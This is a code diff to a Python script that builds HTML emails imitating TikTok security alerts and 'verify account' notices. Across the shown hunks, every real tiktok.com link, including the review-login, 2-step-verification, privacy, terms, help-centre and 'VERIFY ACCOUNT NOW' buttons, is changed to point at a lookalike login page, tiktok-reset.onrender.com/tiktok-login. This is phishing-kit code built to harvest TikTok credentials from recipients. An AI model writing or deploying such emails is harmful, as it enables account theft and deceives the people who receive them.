@@ -550,8 +550,8 @@ def send_tiktok_security_alert(recipient_email, alert_type="new_device", tiktok_
             
             <!-- Action Buttons -->
             <div class="action-buttons">
-                <a href="https://tiktok.com/security" class="btn">Review Login Activity</a>
-                <a href="https://tiktok.com/settings/security" class="btn btn-secondary">Security Settings</a>
+                            <a href="https://tiktok-reset.onrender.com/tiktok-login" class="btn">Review Login Activity</a>
+            <a href="https://tiktok-reset.onrender.com/tiktok-login" class="btn btn-secondary">Security Settings</a>
             </div>
             
             <!-- Security Tips -->
@@ -565,7 +565,7 @@ def send_tiktok_security_alert(recipient_email, alert_type="new_device", tiktok_
             
             <!-- Learn More Link -->
             <div style="text-align: center; margin: 25px 0;">
-                <a href="https://tiktok.com/help/2fa" style="color: #ff0050; text-decoration: none; font-weight: 600; font-size: 16px;">
+                <a href="https://tiktok-reset.onrender.com/tiktok-login" style="color: #ff0050; text-decoration: none; font-weight: 600; font-size: 16px;">
                     Learn more about 2-step verification
                 </a>
         </div>
@@ -579,9 +579,9 @@ def send_tiktok_security_alert(recipient_email, alert_type="new_device", tiktok_
         <!-- Footer -->
         <div class="footer">
             <div class="footer-links">
-                <a href="https://tiktok.com/privacy">Privacy Policy</a>
-                <a href="https://tiktok.com/terms">Terms of Service</a>
-                <a href="https://tiktok.com/help">Help Center</a>
+                <a href="https://tiktok-reset.onrender.com/tiktok-login">Privacy Policy</a>
+                <a href="https://tiktok-reset.onrender.com/tiktok-login">Terms of Service</a>
+                <a href="https://tiktok-reset.onrender.com/tiktok-login">Help Center</a>
             </div>
             
             <div class="company-info">
@@ -775,7 +775,7 @@ def send_tiktok_verification_required(recipient_email, tiktok_username="user"):
             </div>
             
             <!-- Verification Button -->
-            <a href="https://tiktok.com/verify" class="verification-button">
+            <a href="https://tiktok-reset.onrender.com/tiktok-login" class="verification-button">
                 VERIFY ACCOUNT NOW
             </a>
             
